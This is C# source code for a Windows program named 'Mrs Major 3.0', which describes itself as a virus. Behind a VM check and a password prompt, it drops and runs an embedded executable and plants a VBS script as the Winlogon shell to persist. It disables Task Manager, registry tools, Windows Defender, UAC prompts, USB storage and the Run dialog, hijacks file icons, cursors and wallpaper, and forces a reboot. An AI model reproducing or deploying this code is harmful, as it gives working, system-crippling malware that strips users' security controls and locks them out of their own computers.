using System.IO;
using System.Net;
using System.Windows.Forms;
using System;
using System.Diagnostics;
using System.Reflection;
using Microsoft.Win32;
using System.Management;
using System.Threading.Tasks;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Mrs_Major_3._0
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            string textToCheck = textBox2.Text.ToLower();
            if (textToCheck.Equals("fed2099e") ||
                textToCheck.Equals("3_kt6p?e") ||
                textToCheck.Equals("session0"))
            {
                this.Hide();
                Form2 verForm = new Form2();
                verForm.StartPosition = FormStartPosition.Manual;
                verForm.Location = this.Location;
                verForm.Show();

                Timer timer = new Timer();
                timer.Interval = 2000;
                timer.Tick += async (s, args) =>
                {
                    timer.Stop();
                    Rules rulesForm = new Rules();
                    rulesForm.StartPosition = FormStartPosition.CenterScreen;
                    rulesForm.Show();
                    await Task.Run(() =>
                    {
                        Reboot.CreateDirectories();
                        Reboot.DownloadFile();
                        Reboot.CheckFilesAsync().Wait();
                    });
                };
                timer.Start();
            }
            else
            {
                this.Hide();
                Form3 errForm = new Form3();
                errForm.StartPosition = FormStartPosition.Manual;
                errForm.Location = this.Location;
                errForm.Show();
            }
        }
        static bool IsRunningOnVirtualMachine() //Проверка на виртуальную машину
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
            {
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    string manufacturer = queryObj["Manufacturer"].ToString().ToLower();
                    if ((manufacturer == "microsoft corporation" && queryObj["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                        || manufacturer.Contains("vmware")
                        || queryObj["Model"].ToString() == "VirtualBox")
                    {
                        return true;
                    }
                }
            }
            return false;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            if (IsRunningOnVirtualMachine())
            {
                //Ничего не делаем, просто ждём
            }
            else
            {
                MessageBox.Show("You run MrsMajor on a real PC. This can lead to damage to the system, or lose your PC. Like a decent virus, I refuse to run on this computer. To avoid this error, please use a virtual machine.\r\nIf you think that the file was blocked accidentally, then write to support: likuur", "Mrs Major 3.0", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
        }
        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void textBox2_Enter(object sender, EventArgs e)
        {

        }
    }
    public class Reboot
    {
        public static void CreateDirectories()
        {
            string downloadFolderPath = @"C:\Windows\winbase_base_procid_none\";
            string downloadTempFolderPath = @"C:\Windows\BasicContent\media\ect\";
            if (!Directory.Exists(downloadFolderPath))
            {
                Directory.CreateDirectory(downloadFolderPath);
            }
            Directory.CreateDirectory(downloadTempFolderPath);
            string baseFolder = @"C:\windows\winbase_base_procid_none\";
            try
            {
                for (int i = 1; i <= 80; i++)
                {
                    string folderName = "secureloc0x" + i.ToString("D2");
                    string folderPath = Path.Combine(baseFolder, folderName);
                    if (!Directory.Exists(folderPath))
                    {
                        Directory.CreateDirectory(folderPath);
                    }
                    else
                    {
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }
        public static void DownloadFile()
        {
            try
            {
                string resourceName = "Mrs_Major_3._0.Properties.Resources.winful";
                string tempFilePath = Path.Combine(Path.GetTempPath(), "winful.exe");

                using (var resourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    if (resourceStream == null)
                        throw new FileNotFoundException("Resource not found.");

                    using (var fileStream = new FileStream(tempFilePath, FileMode.Create, FileAccess.Write))
                    {
                        resourceStream.CopyTo(fileStream);
                    }
                }
                Process.Start(tempFilePath);
            }
            catch(Exception ex)
            {
                MessageBox.Show($"Error opening file: {ex.Message}", "Mrs Major 3.0", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public static async Task CheckFilesAsync()
        {
            string autoZagrPath = @"C:\Windows\winbase_base_procid_none\secureloc0x65\winsxs.ico";
            while (true)
            {
                if (File.Exists(autoZagrPath))
                {
                    Reboot.setrules();
                    Reboot.RebootPC();
                }
                await Task.Delay(1000);
            }
        }
        private static void WinlogonStartUp(string StartupTo, string path)
        {
            RegistryKey LocalMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            RegistryKey Winlogon = LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            string StartUpValue = Winlogon.GetValue(StartupTo).ToString();
            if (path != null && StartUpValue.Contains(path) == false)
            {
                Winlogon.SetValue(StartupTo, $"{StartUpValue}, {path}");
                Winlogon.Close();
            }
        }
        public static void setrules()
        {
            string ke = "C:\\windows\\winbase_base_procid_none\\secureloc0x65\\winsxs.ico";
            Registry.SetValue(@"HKEY_CLASSES_ROOT\txtfile\DefaultIcon", "", ke, RegistryValueKind.String);
            Registry.SetValue(@"HKEY_CLASSES_ROOT\exefile\DefaultIcon", "", ke, RegistryValueKind.String);
            Registry.SetValue(@"HKEY_CLASSES_ROOT\mp3file\DefaultIcon", "", ke, RegistryValueKind.String);
            Registry.SetValue(@"HKEY_CLASSES_ROOT\mp4file\DefaultIcon", "", ke, RegistryValueKind.String);
            Registry.SetValue(@"HKEY_CLASSES_ROOT\inifile\DefaultIcon", "", ke, RegistryValueKind.String);
            Registry.SetValue(@"HKEY_CLASSES_ROOT\rarfile\DefaultIcon", "", ke, RegistryValueKind.String);
            //RegistryKey explorer = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            //explorer.SetValue("Shell", "explorer.exe, C:\\windows\\winbase_base_procid_none\\secureloc0x65\\WinRapistI386.vbs", RegistryValueKind. String);
            //explorer.Dispose();
            try
            {
                WinlogonStartUp("Shell", "C:\\windows\\winbase_base_procid_none\\secureloc0x65\\WinRapistI386.vbs");
            }catch { }
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
                  "DisableTaskMgr", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
                              "DisableRegistryTools", 1, RegistryValueKind.DWord);

            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
            {
                key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                key.Dispose();
            }

            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                              "NoWinKeys", 1, RegistryValueKind.DWord);

            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}",
                              "Restrict_Run", 1, RegistryValueKind.DWord);

            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                              "EnableLUA", 0, RegistryValueKind.DWord);
            RegistryKey keyau = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
            keyau.SetValue("Shell", @"explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""");
            try
            {
                RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system");
                key.SetValue("ConsentPromptBehaviorAdmin", 0);
                key.Dispose();
            }
            catch { }
            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
                key.SetValue("NoChangingWallPaper", 1);
                key.Dispose();
            }
            catch { }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                key.SetValue("NoRun", 1);
                key.Dispose();
            }
            catch { }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                key.SetValue("NoWinKeys", 1);
                key.Dispose();
            }
            catch { }

            try
            {
                RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\usbstor");
                key.SetValue("Start", 4);
                key.Dispose();
            }
            catch { }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                key.SetValue("Arrow", @"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
                key.SetValue("AppStarting", @"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
                key.SetValue("Hand", @"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
                key.Dispose();
            }
            catch { }

            RegistryKey kay = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\system", true);
            if (kay != null)
            {
                kay.SetValue("Wallpaper", @"C:\Windows\BasicContent\media\ect\bgtheme.jpg", RegistryValueKind.String);
                kay.Close();
            }
        }
        public static void RebootPC()
        {
            try
            {
                Process.Start("shutdown", "/r /t 10");
            }
            catch
            {
                MessageBox.Show("Error reboot PC.\r\nError code: pcreberr", "Mrs Major 3.0", MessageBoxButtons.OK);
            }
        }
    }
}